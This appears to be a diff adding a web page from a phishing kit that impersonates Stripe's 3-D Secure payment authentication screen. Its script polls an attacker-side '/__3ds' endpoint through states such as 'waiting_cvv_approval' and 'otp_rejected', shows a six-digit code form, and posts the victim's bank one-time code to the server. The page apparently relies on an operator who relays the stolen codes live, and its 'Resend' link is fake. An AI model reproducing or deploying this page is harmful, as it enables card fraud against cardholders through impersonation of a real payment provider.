@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure authentication — Stripe</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Ubuntu, sans-serif;
+            background: #f6f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .container {
+            width: 100%;
+            max-width: 440px;
+        }
+        .stripe-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+        .stripe-logo-mark {
+            width: 28px;
+            height: 28px;
+            background: #635bff;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+        }
+        .stripe-logo-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #32325d;
+            letter-spacing: -0.5px;
+        }
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 50px 100px -20px rgba(50, 50, 93, 0.15),
+                        0 30px 60px -30px rgba(0, 0, 0, 0.2);
+            padding: 36px 32px;
+            width: 100%;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #6b7c93;
+            margin-bottom: 24px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 500;
+        }
+        .secure-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #6b7c93;
+        }
+        .issuer-info {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .issuer-logo {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #635bff 0%, #32325d 100%);
+            border-radius: 10px;
+            margin: 0 auto 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        h1 {
+            color: #32325d;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            color: #6b7c93;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .spinner-wrap {
+            display: flex;
+            justify-content: center;
+            padding: 30px 0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e6ebf1;
+            border-top-color: #635bff;
+            border-radius: 50%;
+            animation: spin 0.75s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .otp-form {
+            display: none;
+        }
+        .otp-form.active {
+            display: block;
+        }
+        .otp-label {
+            display: block;
+            color: #32325d;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .otp-input {
+            flex: 1;
+            height: 48px;
+            border: 1.5px solid #e6ebf1;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            color: #32325d;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+            background: #f6f9fc;
+        }
+        .otp-input:focus {
+            border-color: #635bff;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(99, 91, 255, 0.1);
+        }
+        .otp-input.error {
+            border-color: #fa755a;
+            background: #fdf5f3;
+        }
+        .error-message {
+            color: #fa755a;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 14px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .submit-btn {
+            width: 100%;
+            height: 44px;
+            background: #635bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(99, 91, 255, 0.25);
+        }
+        .submit-btn:hover {
+            background: #564bf2;
+        }
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+        .submit-btn:disabled {
+            background: #c3c1d9;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+        .resend-row a {
+            color: #635bff;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .resend-row a:hover {
+            text-decoration: underline;
+        }
+        .resend-row .hint {
+            color: #8898aa;
+        }
+        .expired-state, .completed-state {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .expired-state.show, .completed-state.show {
+            display: block;
+        }
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: #3ecf8e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 32px;
+            animation: popIn 0.4s ease-out;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            70% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .expired-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        .completed-state h2, .expired-state h2 {
+            color: #32325d;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .completed-state p, .expired-state p {
+            color: #6b7c93;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8898aa;
+        }
+        .footer a {
+            color: #635bff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="stripe-header">
+            <div class="stripe-logo-mark">S</div>
+            <div class="stripe-logo-text">stripe</div>
+        </div>
+
+        <div class="card">
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                </svg>
+                Secure authentication
+            </div>
+
+            <div class="issuer-info">
+                <div class="issuer-logo">••••</div>
+                <h1 id="title">Complete authentication</h1>
+                <p class="subtitle" id="subtitle">Your bank requires additional verification to confirm this payment. This helps keep your account secure.</p>
+            </div>
+
+            <!-- Loading state -->
+            <div id="loading-state" class="spinner-wrap">
+                <div class="spinner"></div>
+            </div>
+
+            <!-- OTP Form state -->
+            <div id="otp-form" class="otp-form">
+                <label class="otp-label">Enter the 6-digit security code sent to your phone</label>
+                <div class="otp-inputs" id="otp-inputs">
+                    <input type="text" class="otp-input" maxlength="1" data-index="0" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
+                </div>
+                <div id="error-msg" class="error-message">Incorrect code. Please try again.</div>
+                <button class="submit-btn" id="submit-btn" onclick="submitOTP()">Verify and continue</button>
+                <div class="resend-row">
+                    <span class="hint">Didn't get a code?</span>
+                    <a onclick="resendCode()">Resend</a>
+                </div>
+            </div>
+
+            <!-- Expired state -->
+            <div id="expired-state" class="expired-state">
+                <div class="expired-icon">⏱️</div>
+                <h2>Session expired</h2>
+                <p>Your verification session has timed out for security.<br>Please return to the merchant and try again.</p>
+            </div>
+
+            <!-- Completed state -->
+            <div id="completed-state" class="completed-state">
+                <div class="success-icon">✓</div>
+                <h2>Authentication successful</h2>
+                <p>Your payment has been verified.<br>You will be redirected shortly...</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            Powered by Stripe. &nbsp;|&nbsp; <a href="#">Privacy</a> &nbsp;|&nbsp; <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        var sessionId = '{session_id}';
+        var redirectUrl = '{redirect_url}';
+        var basePath = '/__3ds';
+        var pollTimer = null;
+        var pollCount = 0;
+        var maxPolls = 300;
+        var currentState = '';
+        var lastOTPCount = 0;
+        var submitting = false;
+
+        function getAPIUrl(endpoint) {
+            return basePath + '/' + endpoint + '?sid=' + encodeURIComponent(sessionId);
+        }
+
+        function showLoading(title, subtitle) {
+            document.getElementById('title').textContent = title;
+            document.getElementById('subtitle').textContent = subtitle;
+            document.getElementById('loading-state').style.display = 'flex';
+            document.getElementById('otp-form').classList.remove('active');
+            document.getElementById('expired-state').classList.remove('show');
+            document.getElementById('completed-state').classList.remove('show');
+        }
+
+        function showOTPForm() {
+            document.getElementById('title').textContent = 'Enter security code';
+            document.getElementById('subtitle').textContent = 'Enter the 6-digit code sent to your phone to confirm this payment.';
+            document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('otp-form').classList.add('active');
+            document.getElementById('expired-state').classList.remove('show');
+            document.getElementById('completed-state').classList.remove('show');
+            document.getElementById('error-msg').classList.remove('show');
+            clearOTPInputs();
+            var inputs = document.querySelectorAll('.otp-input');
+            if (inputs.length > 0) {
+                inputs[0].focus();
+            }
+        }
+
+        function showOTPError() {
+            document.getElementById('error-msg').classList.add('show');
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.classList.add('error');
+            });
+            document.getElementById('submit-btn').disabled = false;
+            inputs.forEach(function(input) {
+                input.disabled = false;
+            });
+        }
+
+        function clearOTPInputs() {
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.value = '';
+                input.classList.remove('error');
+            });
+        }
+
+        function getOTPValue() {
+            var inputs = document.querySelectorAll('.otp-input');
+            var otp = '';
+            inputs.forEach(function(input) {
+                otp += input.value;
+            });
+            return otp;
+        }
+
+        function showExpired() {
+            document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('otp-form').classList.remove('active');
+            document.getElementById('expired-state').classList.add('show');
+            document.getElementById('completed-state').classList.remove('show');
+            stopPolling();
+        }
+
+        function showCompleted() {
+            document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('otp-form').classList.remove('active');
+            document.getElementById('expired-state').classList.remove('show');
+            document.getElementById('completed-state').classList.add('show');
+            stopPolling();
+            setTimeout(function() {
+                if (redirectUrl && redirectUrl !== '{redirect_url}') {
+                    fetch('/__3ds/complete?sid=' + encodeURIComponent(sessionId), {
+                        method: 'POST'
+                    }).catch(function() {
+                    }).finally(function() {
+                        try {
+                            if (window.parent && window.parent !== window) {
+                                window.parent.location.replace(redirectUrl);
+                            } else {
+                                window.location.replace(redirectUrl);
+                            }
+                        } catch (e) {
+                            window.location.replace(redirectUrl);
+                        }
+                    });
+                }
+            }, 2000);
+        }
+
+        function handleState(state, redirectURL, otpCount) {
+            if (state === currentState && state !== 'otp_rejected' && state !== 'otp_waiting') return;
+
+            switch (state) {
+                case 'waiting_cvv_approval':
+                    if (currentState !== state) {
+                        showLoading('Complete authentication', 'Contacting your bank for authentication. This may take a moment...');
+                    }
+                    break;
+                case 'otp_waiting':
+                    if (currentState === 'waiting_cvv_approval' || currentState === '') {
+                        showOTPForm();
+                    } else if (currentState === 'otp_rejected' && otpCount === lastOTPCount) {
+                    } else if (currentState !== 'otp_waiting') {
+                        showOTPForm();
+                    }
+                    break;
+                case 'otp_submitted':
+                    if (currentState !== state) {
+                        showLoading('Verifying', 'Please wait while we verify your code...');
+                    }
+                    break;
+                case 'otp_rejected':
+                    if (otpCount > lastOTPCount) {
+                        lastOTPCount = otpCount;
+                        showOTPForm();
+                        showOTPError();
+                    }
+                    break;
+                case 'completed':
+                    if (redirectURL) {
+                        redirectUrl = redirectURL;
+                    }
+                    showCompleted();
+                    break;
+                case 'expired':
+                    showExpired();
+                    break;
+            }
+            currentState = state;
+        }
+
+        function pollStatus() {
+            if (pollCount >= maxPolls) {
+                showExpired();
+                return;
+            }
+            pollCount++;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', getAPIUrl('status'), true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        handleState(data.state, data.redirect_url, data.otp_count);
+                    } catch (e) {}
+                }
+            };
+            xhr.onerror = function() {};
+            xhr.send();
+        }
+
+        function startPolling() {
+            stopPolling();
+            pollTimer = setInterval(pollStatus, 2000);
+            pollStatus();
+        }
+
+        function stopPolling() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+        }
+
+        function submitOTP() {
+            if (submitting) return;
+
+            var otp = getOTPValue().trim();
+            if (otp.length < 4) {
+                var inputs = document.querySelectorAll('.otp-input');
+                inputs[0].focus();
+                return;
+            }
+
+            submitting = true;
+            document.getElementById('submit-btn').disabled = true;
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.disabled = true;
+            });
+            document.getElementById('error-msg').classList.remove('show');
+
+            showLoading('Verifying', 'Please wait while we verify your code...');
+            stopPolling();
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', getAPIUrl('submit'), true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() {
+                submitting = false;
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        if (data.success) {
+                            currentState = 'otp_submitted';
+                            startPolling();
+                        } else {
+                            showOTPForm();
+                            showOTPError();
+                        }
+                    } catch (e) {
+                        showOTPForm();
+                        showOTPError();
+                    }
+                } else {
+                    showOTPForm();
+                    showOTPError();
+                }
+            };
+            xhr.onerror = function() {
+                submitting = false;
+                showOTPForm();
+                showOTPError();
+            };
+            xhr.send(JSON.stringify({ otp: otp }));
+        }
+
+        function resendCode() {
+            clearOTPInputs();
+            document.getElementById('error-msg').classList.remove('show');
+            var inputs = document.querySelectorAll('.otp-input');
+            if (inputs.length > 0) {
+                inputs[0].focus();
+            }
+        }
+
+        var inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach(function(input, index) {
+            input.addEventListener('input', function(e) {
+                var val = e.target.value;
+                if (val.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                if (val.length > 1) {
+                    e.target.value = val.charAt(val.length - 1);
+                }
+                if (getOTPValue().length >= 6) {
+                    submitOTP();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+                if (e.key === 'Enter') {
+                    submitOTP();
+                }
+            });
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var pastedData = (e.clipboardData || window.clipboardData).getData('text');
+                pastedData = pastedData.replace(/\D/g, '');
+                for (var i = 0; i < pastedData.length && index + i < inputs.length; i++) {
+                    inputs[index + i].value = pastedData.charAt(i);
+                }
+                var nextIndex = Math.min(index + pastedData.length, inputs.length - 1);
+                inputs[nextIndex].focus();
+                if (pastedData.length >= 6) {
+                    setTimeout(submitOTP, 100);
+                }
+            });
+        });
+
+        startPolling();
+    </script>
+</body>
+</html>
